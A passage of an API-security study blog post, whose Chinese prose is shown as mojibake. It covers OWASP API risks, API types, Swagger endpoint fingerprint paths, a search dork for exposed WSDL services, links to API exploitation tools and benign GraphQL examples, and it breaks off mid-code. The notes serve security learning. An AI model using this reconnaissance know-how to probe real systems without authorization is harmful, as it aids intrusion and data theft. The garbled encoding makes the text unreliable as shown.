        <content type="html"><![CDATA[<p>API å®‰å…¨åŸºæœ¬ç°çŠ¶ <a href="https://www.akamai.com/site/zh/documents/white-paper/2024/api-security-fundamentals.pdf">https://www.akamai.com/site/zh/documents/white-paper/2024/api-security-fundamentals.pdf</a><br>OWASP API Security TOP 10ä¸­æ–‡é¡¹ç›® 2023 <a href="http://www.owasp.org.cn/OWASP-CHINA/owasp-project/owasp-api-security-top-104e2d6587987976ee/OWASP-API%E5%AE%89%E5%85%A8Top10-2023-v1-0818.pdf">http://www.owasp.org.cn/OWASP-CHINA/owasp-project/owasp-api-security-top-104e2d6587987976ee/OWASP-API%E5%AE%89%E5%85%A8Top10-2023-v1-0818.pdf</a><br>OWASP åå¤§ API å®‰å…¨é£é™©ï¼š2023 å¹´ç‰ˆç»ˆäºé—®ä¸– <a href="https://www.akamai.com/zh/blog/security/owasp-top-10-api-security-risks-2023-edition">https://www.akamai.com/zh/blog/security/owasp-top-10-api-security-risks-2023-edition</a><br>API å®‰å…¨ç­–ç•¥å’ŒåŸºç¡€æŒ‡å— <a href="https://xie.infoq.cn/article/fb0ed41639922d2aa90befb97">https://xie.infoq.cn/article/fb0ed41639922d2aa90befb97</a><br>æ­£ç¡®ç”„åˆ«APIã€REST APIã€RESTful APIå’ŒWeb Serviceä¹‹é—´çš„å¼‚åŒ <a href="https://cloud.tencent.com/developer/article/1448167">https://cloud.tencent.com/developer/article/1448167</a><br>æµ…ææ¥å£å®‰å…¨ä¹‹WebService <a href="https://xz.aliyun.com/t/7541">https://xz.aliyun.com/t/7541</a><br>èœé¸Ÿæ•™ç¨‹wsdl <a href="https://www.runoob.com/wsdl/wsdl-summary.html">https://www.runoob.com/wsdl/wsdl-summary.html</a><br><strong>SOAPåè®®å®‰å…¨æ”»é˜²å½•</strong> <a href="https://xz.aliyun.com/t/13285">https://xz.aliyun.com/t/13285</a><br>SOAPæœ€å…¨Web Serviceæ¸—é€æµ‹è¯•æ€»ç»“ <a href="https://blog.csdn.net/weixin_50464560/article/details/125022377">https://blog.csdn.net/weixin_50464560/article/details/125022377</a><br>Graphqlæ¥å£å®‰å…¨é—®é¢˜æµ…æ <a href="https://xz.aliyun.com/t/13733">https://xz.aliyun.com/t/13733</a><br><strong>ã€ç¿»è¯‘ã€‘GraphQL API æ¼æ´çš„å¸¸è§æ”»å‡»æ–¹æ³•æ€»ç»“</strong> <a href="https://xz.aliyun.com/t/14913">https://xz.aliyun.com/t/14913</a><br>GraphQLå®‰å…¨æŒ‡åŒ— <a href="https://www.freebuf.com/articles/web/184040.html">https://www.freebuf.com/articles/web/184040.html</a></p><p><a href="https://salt.security/">https://salt.security/</a></p><p>Bookï¼šAPIå®‰å…¨å®æˆ˜ã€APIå®‰å…¨æŠ€æœ¯ä¸å®æˆ˜</p><h2 id="ç±»åˆ«"><a href="#ç±»åˆ«" class="headerlink" title="ç±»åˆ«"></a>ç±»åˆ«</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-1.png"></p><table><thead><tr><th>ä½¿ç”¨æ¨¡å¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>HTTP API</td><td>è¿™ç±» API ä½¿ç”¨è¶…æ–‡æœ¬ä¼ è¾“åè®®ä½œä¸º API è°ƒç”¨çš„é€šä¿¡åè®®ã€‚</td></tr><tr><td>RESTful API</td><td>è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ (RESTful) å¯è¿½æº¯åˆ° Roy Fielding 2000 å¹´çš„åšå£«è®ºæ–‡ï¼Œæ˜¯æœ€å¸¸è§çš„ Web API ç±»å‹ï¼Œé€šå¸¸ä½¿ç”¨ JSONï¼ˆJavaScript å¯¹è±¡è¡¨ç¤ºæ³•ï¼‰æ¥å­˜å‚¨æ•°æ®ã€‚RESTful API æ˜“äºä¾›ç°ä»£å‰ç«¯æ¡†æ¶ï¼ˆä¾‹å¦‚ React å’Œ React Nativeï¼‰ä½¿ç”¨</td></tr><tr><td>GraphQL API</td><td>GraphQL æ˜¯ä¸€ç§ç”¨äº API çš„æŸ¥è¯¢è¯­è¨€ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯ä»¥å£°æ˜çš„æ–¹å¼å®šä¹‰è¯·æ±‚çš„æ•°æ®ï¼Œè€Œä¸éœ€è¦äº†è§£æœåŠ¡ç«¯å¦‚ä½•è¿”å›æ•°æ®ã€‚GraphQL API å…è®¸å®¢æˆ·ç«¯åœ¨å•ä¸ªè¯·æ±‚ä¸­åŒæ—¶è·å–å¤šä¸ªèµ„æºï¼Œä»è€Œå‡å°‘ç½‘ç»œè¯·æ±‚çš„æ•°é‡ï¼Œå¹¶ä½¿å®¢æˆ·ç«¯å¯ä»¥æ›´è½»æ¾åœ°ä½¿ç”¨</td></tr><tr><td>SOAP</td><td>SOAP ä½¿ç”¨è¯¦ç»†çš„å¯æ‰©å±•æ ‡è®°è¯­è¨€ (XML) è¿›è¡Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)ã€‚</td></tr><tr><td>XML-RPC</td><td>XML-RPC æ˜¯é€šè¿‡äº’è”ç½‘è¿›è¡Œè¿‡ç¨‹è°ƒç”¨çš„ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨ XMLè¿›è¡Œç¼–ç å¹¶ç”¨ HTTP ä½œä¸ºé€šä¿¡åè®®ã€‚</td></tr><tr><td>gRPC</td><td>gRPC API æ˜¯ Google å¼€å‘çš„ HTTP&#x2F;2.0 é«˜æ€§èƒ½äºŒè¿›åˆ¶åè®®ï¼Œä¸»è¦ç”¨äºä¸œè¥¿å‘é€šä¿¡ã€‚</td></tr><tr><td>OpenAPI</td><td>OpenAPI æ˜¯ API çš„ä¸€ç§æè¿°å’Œæ–‡æ¡£è§„èŒƒã€‚åœ¨æ—§ç‰ˆæœ¬ä¸­ï¼ŒOpenAPI è¢«ç§°ä¸º Swaggerï¼Œä¸¤ç§è¯´æ³•ç°åœ¨ä»ç„¶ç»å¸¸æ··æ·†ä½¿ç”¨ã€‚</td></tr></tbody></table><p>ä»€ä¹ˆæ˜¯å—åŒ—å‘ APIï¼Ÿ<br>è¿™äº› API æ˜¯ä¼ä¸šä¾›å¤–ç•Œè®¿é—®çš„ APIï¼Œä¸»è¦ç”¨äºä¸ä¸šåŠ¡åˆä½œä¼™ä¼´å¼€å±•ä¸šåŠ¡ã€‚è¿™ç§æƒ…å†µç§°ä¸º API å¼€æ”¾ã€‚ä¾‹å¦‚ï¼Œæ”¯æŒå¼€æ”¾é“¶è¡Œä¸šåŠ¡çš„é“¶è¡Œå¯èƒ½é€šè¿‡ API å‘å…¶ä»–é‡‘èç§‘æŠ€ä¼ä¸šæˆ–é‡‘èæœåŠ¡ä¼ä¸šå¼€æ”¾å…¶å¸æˆ·ã€‚åŒ»ç–—ä¿å¥ä¼ä¸šå¯èƒ½é€šè¿‡ API å‘ä¿é™©å…¬å¸å’Œå…¶ä»–åŒ»ç–—ä¼ä¸šå¼€æ”¾æ‚£è€…è®°å½•ã€‚å—åŒ—å‘ API é€šå¸¸è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œå› ä¸º API è®¿é—®å·²è·å¾—æˆæƒå¹¶å·²ç»è¿‡èº«ä»½éªŒè¯ã€‚è¿™äº› API é€šå¸¸å¢é•¿æå¿«ä¸”æ•°é‡åºå¤§ï¼Œå› æ­¤å¯¹å¤§å¤šæ•°ä¼ä¸šè€Œè¨€æ˜¯å¾ˆå¤§çš„æ”»å‡»é¢ã€‚<br>ä»€ä¹ˆæ˜¯ä¸œè¥¿å‘ APIï¼Ÿ<br>è¿™äº› API æ˜¯ä¼ä¸šå†…éƒ¨ä½¿ç”¨çš„ APIï¼Œä¼ä¸šå¤–éƒ¨çš„ä»»ä½•äººéƒ½ä¸åº”è®¿é—®ã€‚è¿™äº› API è¿æ¥å†…éƒ¨åº”ç”¨ç¨‹åºï¼Œæˆ–è€…è¿æ¥ä¸šåŠ¡å•ä½æˆ–éƒ¨é—¨ã€‚<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image.png"></p><h2 id="APIå®‰å…¨é—®é¢˜"><a href="#APIå®‰å…¨é—®é¢˜" class="headerlink" title="APIå®‰å…¨é—®é¢˜"></a>APIå®‰å…¨é—®é¢˜</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-3.png"></p><ul><li>æ¼æ´åˆ©ç”¨ï¼šåº•å±‚åŸºç¡€æ¶æ„ä¸­çš„æŠ€æœ¯æ¼æ´å¯èƒ½ä¼šå¯¼è‡´æœåŠ¡å™¨å—æŸã€‚æ­¤ç±»æ¼æ´çš„ä¾‹å­å¾ˆå¤šï¼Œä» Apache Struts æ¼æ´ï¼ˆCVE-2017-9791ã€CVE-2018-11776 ç­‰ï¼‰åˆ° Log4j æ¼æ´ï¼ˆCVE-2021-44228 ç­‰ï¼‰éƒ½åŒ…æ‹¬åœ¨å†…ã€‚</li><li>ä¸šåŠ¡é€»è¾‘æ»¥ç”¨ï¼šè¿™äº›å¯æ€•çš„åœºæ™¯æ—¶å¸¸è®©é¦–å¸­ä¿¡æ¯å®‰å…¨å®˜ (CISO) å½»å¤œéš¾çœ ï¼Œå› ä¸ºä¼ ç»Ÿçš„å®‰å…¨æ§åˆ¶æªæ–½å¯¹æ­¤æ¯«æ— ç”¨å¤„ã€‚é€»è¾‘æ»¥ç”¨æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨åº”ç”¨ç¨‹åºè®¾è®¡æˆ–å®æ–½çš„ç¼ºé™·æ¥å¼•å‘æ„å¤–è¡Œä¸ºå’Œæœªç»æ‰¹å‡†çš„è¡Œä¸ºã€‚</li><li>æœªç»æˆæƒçš„æ•°æ®è®¿é—®ï¼šAPI æ»¥ç”¨çš„å¦ä¸€ç§å¸¸è§å½¢å¼æ˜¯æ”»å‡»è€…åˆ©ç”¨å¤±æ•ˆçš„æˆæƒæœºåˆ¶æ¥è®¿é—®å…¶æ— æƒè®¿é—®çš„æ•°æ®ã€‚è¿™äº›æ¼æ´æœ‰å¾ˆå¤šåç§°ï¼Œä¾‹å¦‚å¤±æ•ˆçš„å¯¹è±¡çº§æˆæƒ (BOLA)ã€ä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ (IDOR)ï¼Œä»¥åŠå¤±æ•ˆçš„åŠŸèƒ½çº§æˆæƒ (BFLA)ã€‚æœ€æ–°çš„æ¼æ´åˆ—è¡¨å¯ä»¥åœ¨OWASP API å®‰å…¨é¡¹ç›®ç½‘ç«™ä¸ŠæŸ¥çœ‹ã€‚</li><li>å¸æˆ·æ¥ç®¡ï¼šåœ¨å‡­æ®è¢«ç›—ä¹ƒè‡³ XSS æ”»å‡»ä¹‹åï¼Œå¸æˆ·å¯èƒ½ä¼šè¢«æ¥ç®¡ã€‚ä¸€æ—¦å‘ç”Ÿè¿™ç§æƒ…å†µï¼Œå³ä½¿æ˜¯ç¼–å†™å¾—æœ€å¥½ã€å®‰å…¨æ€§æœ€é«˜çš„ API ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚æ¯•ç«Ÿï¼Œå¦‚æœä¸æ‰§è¡Œè¡Œä¸ºåˆ†æï¼Œä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„æ´»åŠ¨éƒ½è¢«è§†ä¸ºåˆæ³•ä½¿ç”¨ã€‚</li><li>æ•°æ®æŠ“å–ï¼šå¦‚æœä¼ä¸šé€šè¿‡å…¬å…± API æä¾›æ•°æ®é›†ï¼Œæ”»å‡»è€…å°±å¯èƒ½ç§¯ææŸ¥è¯¢è¿™äº›èµ„æºï¼Œä»¥ä¾¿æ‰¹é‡æ•è·å¤§ä½“é‡ã€æœ‰ä»·å€¼çš„æ•°æ®é›†ã€‚</li><li>ä¸šåŠ¡æ‹’ç»æœåŠ¡ (DoS)ï¼šAPI æ”»å‡»è€…å¦‚æœè¯·æ±‚åç«¯æ‰§è¡Œç¹é‡ä»»åŠ¡ï¼Œå¯èƒ½å¼•å‘åº”ç”¨ç¨‹åºå±‚çš„â€œæœåŠ¡ä¾µèš€â€æˆ–å®Œå…¨æ‹’ç»æœåŠ¡ï¼ˆGraphQL ä¸­ååˆ†å¸¸è§çš„ä¸€ä¸ªæ¼æ´ï¼Œä½†ä»»ä½•èµ„æºå¯†é›†å‹ API ç«¯ç‚¹å®æ–½éƒ½å¯èƒ½å‘ç”Ÿè¿™ç§æƒ…å†µï¼‰ã€‚</li></ul><p>å¯ä»¥ä½¿ç”¨postmanè¿›è¡Œæµ‹è¯•ï¼Œä¼˜ç‚¹æ˜¯æ–¹ä¾¿ï¼Œç§ç±»é½å…¨ï¼š<a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a><br>é’ˆå¯¹APIçš„å®‰å…¨é—®é¢˜æµ‹è¯•å’Œæ™®é€šçš„webå®‰å…¨æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåªæ˜¯æ”»å‡»è½½è·éœ€è¦æ»¡è¶³ç‰¹å®šçš„è¦æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlå¾ˆå¤šæ—¶å€™å°±ä¼šæœ‰ç‰¹å¾</span><br><span class="line">/api/openapi.json</span><br><span class="line">/api/v2/swagger.json</span><br><span class="line">/api/v1/swagger.yaml</span><br></pre></td></tr></table></figure><h2 id="Web-Service-API"><a href="#Web-Service-API" class="headerlink" title="Web Service API"></a>Web Service API</h2><p><a href="https://cloud.tencent.com/developer/article/1666998">https://cloud.tencent.com/developer/article/1666998</a><br>WSDLï¼ˆWeb Services Description Languageï¼‰å³ç½‘ç»œæœåŠ¡æè¿°è¯­è¨€ï¼Œç”¨äºæè¿°Web æœåŠ¡çš„å…¬å…±æ¥å£ã€‚è¿™æ˜¯ä¸€ä¸ªåŸºäº XML çš„å…³äºå¦‚ä½•ä¸ Web æœåŠ¡é€šè®¯å’Œä½¿ç”¨çš„æœåŠ¡æè¿°ï¼›ä¹Ÿå°±æ˜¯æè¿°ä¸ç›®å½•ä¸­åˆ—å‡ºçš„ Web æœåŠ¡è¿›è¡Œäº¤äº’æ—¶éœ€è¦ç»‘å®šçš„åè®®å’Œä¿¡æ¯æ ¼å¼ã€‚é€šå¸¸é‡‡ç”¨æŠ½è±¡è¯­è¨€æè¿°è¯¥æœåŠ¡æ”¯æŒçš„æ“ä½œå’Œä¿¡æ¯ï¼Œä½¿ç”¨çš„æ—¶å€™å†å°†å®é™…çš„ç½‘ç»œåè®®å’Œä¿¡æ¯æ ¼å¼ç»‘å®šç»™è¯¥æœåŠ¡ã€‚SOAPã€RESTå…¶å®ä¹Ÿéƒ½æ˜¯Web Service API<br>wsdlæ˜¯ä¸€ä¸ªxmlï¼Œç”¨äºè¯´æ˜soapæ¶ˆæ¯åŠå¦‚ä½•ä½¿ç”¨è¿™äº›æ¶ˆæ¯ï¼Œé€šå¸¸å½¢å¼ä¸ºasmx?wsdl<br>æŸ¥è¯¢è¯­æ³•ï¼šinurl:(_vti_bin | api | webservice | ws | ?wsdl )&#96;ï¼Œæ¢æµ‹è¯¸å¦‚â€œ.dll?wsdlâ€ã€â€œ.ashx?wsdlâ€ã€â€œ.exe?wsdlâ€æˆ–è€…â€œ.php?wsdlâ€ç­‰ç­‰çš„Web Serviceåœ°å€ã€‚</p><p>åˆ©ç”¨å·¥å…·ï¼šSoapUIã€ReadyAPIï¼Œè¿™ä¸¤ä¸ªéƒ½æ˜¯å¯¼å…¥ç›¸åº”çš„apiæ–‡æ¡£åè‡ªåŠ¨åŒ–ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹è¿›è¡Œå®‰å…¨æµ‹è¯•ï¼ŒBurpsuiteçš„WSDLeræ’ä»¶<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-4.png"><br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-5.png"></p><h3 id="SOAP-å®‰å…¨"><a href="#SOAP-å®‰å…¨" class="headerlink" title="SOAP å®‰å…¨"></a>SOAP å®‰å…¨</h3><p>SOAPï¼ˆSimple Object Access Protocolï¼‰ç®€å•å¯¹è±¡è®¿é—®åè®®æ˜¯äº¤æ¢æ•°æ®çš„ä¸€ç§åè®®è§„èŒƒï¼Œæ˜¯ä¸€ç§è½»é‡çš„ã€ç®€å•çš„ã€åŸºäº XMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ä¸‹çš„ä¸€ä¸ªå­é›†ï¼‰çš„åè®®ï¼Œå®ƒè¢«è®¾è®¡æˆåœ¨ WEB ä¸Šäº¤æ¢ç»“æ„åŒ–çš„å’Œå›ºåŒ–çš„ä¿¡æ¯ã€‚SOAP ä¸æ˜¯ Web Service çš„ä¸“æœ‰åè®®ã€‚SOAP ä½¿ç”¨ HTTP æ¥å‘é€ XML æ ¼å¼çš„æ•°æ®ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºï¼šSOAP &#x3D; HTTP +XML<br>æ¢é’ˆï¼šç›®å½•&amp;JS èµ„æº<br>åˆ©ç”¨ï¼šSoapUI&amp;EXP<br><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a><br><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a><br>ç‰¹å¾æŒ‡çº¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/swagger</span><br><span class="line">/api/swagger</span><br><span class="line">/swagger/ui</span><br><span class="line">/api/swagger/ui</span><br><span class="line">/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/libs/swaggerui</span><br><span class="line">/api/swaggerui</span><br><span class="line">/swagger-resources/configuration/ui</span><br><span class="line">/swagger-resources/configuration/security</span><br><span class="line"></span><br><span class="line">Swaggeræ¥å£æ¼æ´æµ‹è¯•ç±»å‹</span><br><span class="line">æ¥å£è¶Šæƒ</span><br><span class="line">æ¥å£SQLæ³¨å…¥ï¼ˆé’ˆå¯¹æ‰€æœ‰æŸ¥è¯¢æ¥å£ï¼‰</span><br><span class="line">æ¥å£æœªæˆæƒè®¿é—®ï¼ˆé‡ç‚¹é’ˆå¯¹ç®¡ç†å‘˜æ¨¡å—ï¼Œå¦‚å¯¹ç”¨æˆ·çš„å¢åˆ æ”¹æŸ¥ï¼‰</span><br><span class="line">ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆé’ˆå¯¹ä¸Šä¼ æ¥å£è¿›è¡Œæµ‹è¯•ï¼‰</span><br><span class="line">æµ‹è¯•ä¿¡æ¯æ³„éœ²ï¼ˆé‡ç‚¹é’ˆå¯¹ç”¨æˆ·ã€è®¢å•ç­‰ä¿¡æ¯æŸ¥è¯¢æ¥å£ï¼Œä»¥åŠä¸€äº›æµ‹è¯•æ•°æ®ç­‰ï¼‰</span><br></pre></td></tr></table></figure><h3 id="REST-API-å®‰å…¨"><a href="#REST-API-å®‰å…¨" class="headerlink" title="REST API å®‰å…¨"></a>REST API å®‰å…¨</h3><p>RESTï¼ˆRepresentational State Transferï¼‰å³è¡¨è¿°æ€§çŠ¶æ€ä¼ é€’ï¼Œåœ¨ä¸‰ç§ä¸»æµçš„Web æœåŠ¡å®ç°æ–¹æ¡ˆä¸­ï¼Œå› ä¸º REST æ¨¡å¼çš„ Web æœåŠ¡ä¸å¤æ‚çš„ SOAP å’Œ XML-RPC å¯¹æ¯”æ¥è®²æ˜æ˜¾çš„æ›´åŠ ç®€æ´ï¼Œè¶Šæ¥è¶Šå¤šçš„ Web æœåŠ¡å¼€å§‹é‡‡ç”¨ REST é£æ ¼è®¾è®¡å’Œå®ç°ã€‚ä¾‹å¦‚ï¼ŒAmazon.com æä¾›æ¥è¿‘ REST é£æ ¼çš„ Web æœåŠ¡è¿›è¡Œå›¾ä¹¦æŸ¥æ‰¾ï¼›é›…è™æä¾›çš„ Web æœåŠ¡ä¹Ÿæ˜¯REST é£æ ¼çš„ã€‚</p><p>Astraï¼šé’ˆå¯¹REST APIçš„è‡ªåŠ¨åŒ–å®‰å…¨æµ‹è¯•å·¥å…· <a href="https://www.freebuf.com/sectool/232503.html">https://www.freebuf.com/sectool/232503.html</a></p><h2 id="HTTP-API"><a href="#HTTP-API" class="headerlink" title="HTTP API"></a>HTTP API</h2><p>webpackæ˜¯ä¸€ä¸ªå‰ç«¯çš„æ¨¡å—åŒ–æ‰“åŒ…(æ„å»º)çš„å·¥å…·ï¼Œwebpackå°†ä¸€åˆ‡ç¹æ‚çš„ã€é‡å¤çš„ã€æœºæ¢°çš„å·¥ä½œè‡ªåŠ¨å¤„ç†ï¼Œå¼€å‘è€…åªéœ€è¦å…³æ³¨äºåŠŸèƒ½çš„å®ç°çš„<br>æ¢é’ˆï¼šæ’ä»¶&amp;JS èµ„æº<br>åˆ©ç”¨ï¼šPackerFuzzer<br><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>å¯ä»¥ä½¿ç”¨wapplyzerå¸®åŠ©è¯†åˆ«ç½‘ç«™æ˜¯å¦æ˜¯ç”±webpackæ„å»º<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-6.png"><br>å¦‚æœçœ‹åˆ°æœ‰å¾ˆå¤š.jsæ–‡ä»¶ä¹‹ç±»çš„ï¼Œè¿˜æœ‰webpackå°±æœ‰å¯èƒ½æ˜¯äº†<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-7.png"></p><h2 id="GraphQL-å®‰å…¨"><a href="#GraphQL-å®‰å…¨" class="headerlink" title="GraphQL å®‰å…¨"></a>GraphQL å®‰å…¨</h2><p>GraphQLæ˜¯ä¸€ç§APIæŸ¥è¯¢è¯­è¨€ï¼Œæ˜¯ä¸ºäº†ä¿ƒè¿›å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é«˜æ•ˆé€šä¿¡ã€‚ä»è¿™ä¸ªå•è¯ä¸Šçœ‹ï¼Œæ„Ÿè§‰å’ŒSQLçš„åŒºåˆ«å°±åœ¨äºè¯­å¥ç»“æ„å§ï¼Œæœ¯ä¸šæœ‰ä¸“æ”»ï¼ŒGraphQLæ˜¯ç”¨æ¥æŸ¥è¯¢APIçš„ã€‚å®ƒä½¿ç”¨æˆ·èƒ½å¤Ÿå‡†ç¡®æŒ‡å®šä»–ä»¬æƒ³è¦åœ¨å“åº”ä¸­åŒ…å«å“ªäº›æ•°æ®ï¼Œä»è€Œæœ‰åŠ©äºé¿å…æœ‰æ—¶åœ¨REST APIä¸­å‡ºç°çš„å¤§å‹å“åº”å¯¹è±¡å’Œå¤šæ¬¡è°ƒç”¨ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯é˜²æ­¢è¿”å›æ„å¤–çš„æ•°æ®ã€‚<br>GraphQLæœåŠ¡å®šä¹‰äº†ä¸€ä¸ªåˆçº¦ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¯¥åˆçº¦ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚å®¢æˆ·ç«¯ä¸éœ€è¦çŸ¥é“æ•°æ®ä¿å­˜åœ¨å“ªé‡Œã€‚ç›¸åï¼Œå®¢æˆ·ç«¯å°†æŸ¥è¯¢å‘é€åˆ°GraphQLæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨ä»ç›¸å…³ä½ç½®è·å–æ•°æ®ã€‚ç”±äºGraphQLä¸å¹³å°æ— å…³ï¼Œå› æ­¤å®ƒå¯ä»¥ä½¿ç”¨å¤šç§ç¼–ç¨‹è¯­è¨€æ¥å®ç°ï¼Œå¹¶ä¸”å¯ç”¨äºä¸å‡ ä¹ä»»ä½•æ•°æ®åº“è¿›è¡Œé€šä¿¡ã€‚</p><p>GraphQLæŸ¥è¯¢æ˜¯ä»æ•°æ®å­˜å‚¨ä¸­æ£€ç´¢æ•°æ®ã€‚å®ƒä»¬å¤§è‡´ç›¸å½“äºREST APIä¸­çš„GETè¯·æ±‚ã€‚æŸ¥è¯¢é€šå¸¸å…·æœ‰ä»¥ä¸‹å…³é”®ç»„æˆéƒ¨åˆ†ï¼š</p><ul><li>ä¸€ä¸ªæŸ¥è¯¢æ“ä½œç±»å‹ã€‚è¿™é¡¹æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯ä¸€èˆ¬å»ºè®®è¿˜æ˜¯é€‰ï¼Œå› ä¸ºå®ƒæ˜ç¡®å‘Šè¯‰æœåŠ¡å™¨ä¼ å…¥çš„è¯·æ±‚æ˜¯ä¸€æ¬¡æŸ¥è¯¢ã€‚</li><li>æŸ¥è¯¢åç§°ã€‚å°±æ˜¯ç»™ä½ çš„æŸ¥è¯¢èµ·ä¸ªåå­—ï¼Œä¹Ÿæ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯ä¸€èˆ¬å»ºè®®è¿˜æ˜¯é€‰ï¼Œå› ä¸ºå®ƒå¯ä»¥æ–¹ä¾¿æˆ‘ä»¬è°ƒè¯•ã€‚</li><li>ä¸€ç§æ•°æ®ç»“æ„ã€‚è¿™æ˜¯æŸ¥è¯¢åº”è¿”å›çš„æ•°æ®ã€‚</li><li>å¯é€‰çš„ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°ã€‚å®ƒä»¬ç”¨äºåˆ›å»ºè¿”å›ç‰¹å®šå¯¹è±¡è¯¦ç»†ä¿¡æ¯çš„æŸ¥è¯¢(ä¾‹å¦‚â€ç»™æˆ‘IDä¸º123çš„äº§å“çš„åç§°å’Œæè¿°â€)</li></ul><p>ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†ä¸€ä¸ªåä¸ºmyGetProductQueryçš„æŸ¥è¯¢ï¼Œè¯¥æŸ¥è¯¢è¯·æ±‚è·å–idä¸º123äº§å“çš„åç§°å’Œæè¿°å­—æ®µï¼š</p><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> myGetProductQuery <span class="punctuation">&#123;</span></span><br><span class="line">    getProduct<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">        name</span><br><span class="line">        description</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å˜æ›´ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å˜æ›´ï¼Œå¢åˆ æ”¹éƒ½å±äºå˜æ›´çš„èŒƒç•´ã€‚å¤§è‡´ç›¸å½“äºREST APIçš„POSTã€PUTå’ŒDELETEæ–¹æ³•ã€‚ä¸æŸ¥è¯¢ä¸€æ ·ï¼Œå˜æ›´ä¹Ÿå…·æœ‰è¿”å›æ•°æ®çš„æ“ä½œç±»å‹ã€åç§°å’Œç»“æ„ã€‚ç„¶è€Œï¼Œå˜æ›´æ€»æ˜¯éœ€è¦æŸç§ç±»å‹çš„è¾“å…¥ã€‚å¯ä»¥æ˜¯å†…è”å€¼ï¼Œä½†å®é™…ä¸Šé€šå¸¸ä½œä¸ºå˜é‡å¼•å…¥ã€‚<br>ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†åˆ›å»ºæ–°äº§å“çš„å˜æ›´åŠå…¶ç›¸å…³å“åº”ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯¥æœåŠ¡è¢«é…ç½®ä¸ºè‡ªåŠ¨ä¸ºå·²æŒ‰è¯·æ±‚è¿”å›çš„æ–°äº§å“åˆ†é…IDï¼š</p><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mutation</span> <span class="punctuation">&#123;</span></span><br><span class="line">    createProduct<span class="punctuation">(</span><span class="symbol">name</span><span class="punctuation">:</span> <span class="string">&quot;Flamin&#x27; Cocktail Glasses&quot;</span>, <span class="symbol">listed</span><span class="punctuation">:</span> <span class="string">&quot;yes&quot;</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">        id</span><br><span class="line">        name</span><br><span class="line">        listed</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="string">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="string">&quot;createProduct&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span 